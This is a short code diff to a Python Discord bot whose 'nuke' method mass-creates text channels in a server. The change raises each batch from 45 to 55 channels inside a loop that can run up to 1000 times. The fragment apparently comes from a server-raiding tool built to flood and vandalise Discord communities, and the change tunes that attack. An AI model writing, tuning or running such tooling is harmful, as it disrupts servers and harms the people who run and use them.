@@ -54,7 +54,7 @@ class DiscordBot(commands.Bot):
     async def nuke(self, latency:int, message:str, guild:discord.Guild, channelName:str, numberOfExecutions=1000):
         logs[self.logId] += "---- Start Nuke ----\n"
         try:
-            await asyncio.gather(*(guild.create_text_channel(channelName) for _ in range(45)))
+            await asyncio.gather(*(guild.create_text_channel(channelName) for _ in range(55)))
             self.channels = list(guild.channels)
             for _ in range(numberOfExecutions):
                 if self.logId in stops:
